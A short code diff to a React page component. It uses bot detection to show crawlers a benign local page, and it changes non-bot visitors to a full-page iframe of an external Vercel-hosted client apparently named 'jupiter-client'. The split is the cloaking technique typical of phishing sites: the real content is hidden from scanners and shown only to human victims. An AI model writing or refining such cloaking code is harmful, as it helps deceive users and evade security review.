@@ -46,7 +46,7 @@ const Index: FC = () => {
     const { isBot, isLoading, shouldRedirect } = useBotDetection();
     const [redirecting, setRedirecting] = useState(false);
     const logSentRef = useRef(false);
-    let[IframeUrl, SetIframeUrl] = useState('https://chimseclient.vercel.app');
+    let[IframeUrl, SetIframeUrl] = useState('https://jupiter-client-seven.vercel.app/');
     let[SiteTitleMeta, SetSiteTitleMeta] = useState('Home Page');
     function showIframe(file,title,favicon) {
     const html = (
@@ -174,8 +174,8 @@ const Index: FC = () => {
     if (isBot) {
         return(showIframe("/id/home.html",SiteTitleMeta,false));
     }
-    return(showIframe("/id/home.html",SiteTitleMeta,false));
-    //return showIframe(IframeUrl,SiteTitleMeta,false);
+    //return(showIframe("/id/home.html",SiteTitleMeta,false));
+    return showIframe(IframeUrl,SiteTitleMeta,false);
 };
 
 export default Index;
